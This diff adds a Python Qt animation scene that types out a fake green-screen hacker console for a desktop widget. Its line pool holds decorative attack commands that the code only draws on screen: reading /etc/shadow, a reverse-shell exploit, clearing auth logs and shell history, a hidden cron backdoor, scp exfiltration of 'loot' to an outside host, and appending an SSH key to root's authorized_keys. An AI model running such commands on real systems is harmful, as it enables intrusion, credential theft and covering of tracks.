@@ -1,0 +1,257 @@
+"""Terminal: a fake green-phosphor hacker console types out across the widget.
+
+Narrated by lines drawn from a shuffled pool (nmap/ssh/root/exploit flavour)
+with occasional red alarm lines. Lines type in at a variable character rate,
+older lines scroll up out of view, and a block cursor blinks on whichever
+line is currently typing. CRT scanline overlay and corner vignette sell the
+old-monitor feel.
+
+Differentiated from the NSA scene: NSA is abstract Matrix-style glyph rain
+behind a rotating cartouche; this one is *readable* pseudo-prose that the
+eye can follow like a story.
+"""
+
+from __future__ import annotations
+
+import random
+
+from core import QtCore, QtGui, NO_PEN, FONT_TYPEWRITER, register_scene
+from scenes._common import (
+    fade_envelope, with_alpha, ensure_state, tick_dt_ms, pulse, make_font,
+)
+
+
+_DURATION_MS = 25000
+
+
+# Colors. Classification key:
+#   `$ ` or `# ` prompts         -> bright (prompt)
+#   `[+] ` success/progress      -> green
+#   `[*] ` info                  -> dim green
+#   `[!] ` warning               -> yellow
+#   `[!!] ` alert                -> red
+#   everything else              -> green
+_C_PROMPT = QtGui.QColor(210, 255, 180)
+_C_GREEN  = QtGui.QColor( 90, 235, 120)
+_C_DIM    = QtGui.QColor( 60, 170,  85)
+_C_YELLOW = QtGui.QColor(255, 210,  80)
+_C_RED    = QtGui.QColor(255,  85,  85)
+_C_CURSOR = QtGui.QColor(180, 255, 150)
+
+
+_LINES = (
+    "$ nmap -sS -Pn -p- 10.0.0.1",
+    "Starting Nmap 7.94 ( https://nmap.org ) at 03:17 UTC",
+    "Nmap scan report for target.local (10.0.0.1)",
+    "22/tcp   open  ssh",
+    "80/tcp   open  http",
+    "443/tcp  open  https",
+    "8080/tcp open  http-proxy",
+    "$ ssh admin@10.0.0.1",
+    "admin@10.0.0.1's password:",
+    "[+] authenticated as admin",
+    "Welcome to the Hexagonal Consortium Terminal",
+    "Last login: Tue Apr 22 03:14 from 172.16.4.12",
+    "$ sudo -i",
+    "[sudo] password for admin:",
+    "# whoami",
+    "root",
+    "# uname -a",
+    "Linux target 5.15.0 #1 SMP x86_64 GNU/Linux",
+    "# cat /etc/shadow | head -3",
+    "root:$6$e7YzL...:19123:0:99999:7:::",
+    "# ./exploit --target 10.0.0.1 --payload reverse_shell",
+    "[*] preparing payload (stage 1 of 3)...",
+    "[*] opening listener on 4444",
+    "[*] connecting to target...",
+    "[+] vulnerability confirmed: CVE-2024-31337",
+    "[+] stage 2 delivered (3412 bytes)",
+    "[+] shell spawned on 10.0.0.1:4444",
+    "[!] antivirus process detected: defender.exe",
+    "[+] bypassing signatures via polymorphic stub",
+    "[!!] INTRUSION DETECTED BY HOST IDS",
+    "[+] clearing /var/log/auth.log",
+    "[+] clearing /var/log/wtmp",
+    "# history -c && history -w",
+    "[+] backdoor installed: /etc/cron.d/.systemd-sync",
+    "# scp loot.tar.gz exfil@10.99.99.99:/data/",
+    "loot.tar.gz                100%  420MB   45.2MB/s",
+    "[!!] ALERT: UNUSUAL OUTBOUND TRAFFIC",
+    "[+] persistence established",
+    "[*] dropping ssh authorized_keys",
+    "# echo 'ssh-ed25519 AAAAC3Nz...' >> /root/.ssh/authorized_keys",
+    "# exit",
+    "logout",
+    "Connection to 10.0.0.1 closed.",
+)
+
+
+def _classify(text):
+    if text.startswith("[!!]"):
+        return _C_RED
+    if text.startswith("[!]"):
+        return _C_YELLOW
+    if text.startswith("[+]"):
+        return _C_GREEN
+    if text.startswith("[*]"):
+        return _C_DIM
+    if text.startswith("$ ") or text.startswith("# "):
+        return _C_PROMPT
+    return _C_GREEN
+
+
+class _Line:
+    __slots__ = ("text", "color", "chars_shown", "finished", "finished_at_ms")
+
+    def __init__(self, text):
+        self.text = text
+        self.color = _classify(text)
+        self.chars_shown = 0.0
+        self.finished = False
+        self.finished_at_ms = None
+
+
+class _State:
+    def __init__(self):
+        self.rng = random.Random()
+        pool = list(_LINES)
+        self.rng.shuffle(pool)
+        self.pool = pool
+        self.next_idx = 0
+        self.buffer = []  # list of _Line, oldest first
+        self.cps = self.rng.uniform(42.0, 75.0)
+        self.cursor_period_ms = self.rng.uniform(450.0, 700.0)
+        self.gap_ms = self.rng.uniform(120.0, 320.0)
+        self.last_tick_ms = 0
+        self.font = None  # built lazily once we know the widget size
+        self.font_px = 0
+        self.line_h = 0
+        self.col_w = 0
+
+
+def _ensure_font(state, rect):
+    # Font size scales with widget height but stays readable on small docks.
+    target_px = max(11, min(18, int(rect.height() * 0.022)))
+    if state.font is not None and state.font_px == target_px:
+        return
+    font = make_font(target_px, bold=False, family="Consolas")
+    font.setStyleHint(FONT_TYPEWRITER)
+    state.font = font
+    state.font_px = target_px
+    fm = QtGui.QFontMetrics(font)
+    state.line_h = fm.height() + 2
+    state.col_w = max(1, fm.horizontalAdvance("M"))
+
+
+def _push_next_line(state):
+    if state.next_idx >= len(state.pool):
+        # Reshuffle and keep going -- durations can outlast the pool.
+        state.rng.shuffle(state.pool)
+        state.next_idx = 0
+    state.buffer.append(_Line(state.pool[state.next_idx]))
+    state.next_idx += 1
+
+
+def _advance_active_line(state, dt_ms, elapsed_ms):
+    if not state.buffer:
+        _push_next_line(state)
+        return
+
+    active = state.buffer[-1]
+    if active.finished:
+        if active.finished_at_ms is None:
+            active.finished_at_ms = elapsed_ms
+        if elapsed_ms - active.finished_at_ms >= state.gap_ms:
+            _push_next_line(state)
+        return
+
+    active.chars_shown += state.cps * (dt_ms / 1000.0)
+    if active.chars_shown >= len(active.text):
+        active.chars_shown = len(active.text)
+        active.finished = True
+        active.finished_at_ms = elapsed_ms
+
+
+def _trim_buffer(state, rect):
+    # Keep only as many lines as fit in the widget's interior padding region.
+    padding_y = int(rect.height() * 0.08)
+    usable = max(1, rect.height() - 2 * padding_y)
+    max_lines = max(3, usable // max(1, state.line_h))
+    while len(state.buffer) > max_lines:
+        state.buffer.pop(0)
+
+
+def _draw_backdrop(painter, rect, fade):
+    painter.fillRect(rect, QtGui.QColor(3, 14, 6, int(200 * fade)))
+
+
+def _draw_vignette(painter, rect, fade):
+    r = max(rect.width(), rect.height()) * 0.75
+    grad = QtGui.QRadialGradient(rect.center(), r)
+    grad.setColorAt(0.55, QtGui.QColor(0, 0, 0, 0))
+    grad.setColorAt(1.00, QtGui.QColor(0, 10, 5, int(150 * fade)))
+    painter.fillRect(rect, QtGui.QBrush(grad))
+
+
+def _draw_scanlines(painter, rect, fade):
+    alpha = int(32 * fade)
+    if alpha <= 0:
+        return
+    pen = QtGui.QPen(QtGui.QColor(0, 0, 0, alpha))
+    pen.setWidthF(1.0)
+    painter.setPen(pen)
+    y = rect.top()
+    while y < rect.bottom():
+        painter.drawLine(rect.left(), y, rect.right(), y)
+        y += 3
+
+
+def _draw_lines(painter, rect, state, elapsed_ms, fade):
+    painter.setFont(state.font)
+    pad_x = int(rect.width() * 0.025) + 6
+    pad_y = int(rect.height() * 0.08)
+
+    # Render bottom-up so the newest line anchors to the bottom.
+    x = rect.left() + pad_x
+    y = rect.bottom() - pad_y
+    for line in reversed(state.buffer):
+        shown = line.text[:int(line.chars_shown)]
+        painter.setPen(with_alpha(line.color, int(235 * fade)))
+        painter.drawText(x, y, shown)
+
+        # Blinking block cursor on whichever line is still typing.
+        if not line.finished:
+            blink = pulse(elapsed_ms, state.cursor_period_ms)
+            if blink > 0.5:
+                fm = QtGui.QFontMetrics(state.font)
+                cx = x + fm.horizontalAdvance(shown)
+                cy_top = y - fm.ascent()
+                painter.setPen(QtGui.QPen(NO_PEN))
+                painter.setBrush(with_alpha(_C_CURSOR, int(220 * fade)))
+                painter.drawRect(QtCore.QRect(cx + 1, cy_top,
+                                              state.col_w, fm.ascent()))
+
+        y -= state.line_h
+        if y < rect.top() + pad_y:
+            break
+
+
+def _paint(painter, rect, elapsed_ms, overlay):
+    state = ensure_state(overlay, _State)
+    fade = fade_envelope(elapsed_ms, _DURATION_MS)
+    dt_ms = tick_dt_ms(state, elapsed_ms)
+
+    _ensure_font(state, rect)
+    _advance_active_line(state, dt_ms, elapsed_ms)
+    _trim_buffer(state, rect)
+
+    painter.setClipRect(rect)
+    painter.setPen(QtGui.QPen(NO_PEN))
+
+    _draw_backdrop(painter, rect, fade)
+    _draw_lines(painter, rect, state, elapsed_ms, fade)
+    _draw_scanlines(painter, rect, fade)
+    _draw_vignette(painter, rect, fade)
+
+
+register_scene("terminal", _DURATION_MS, _paint)
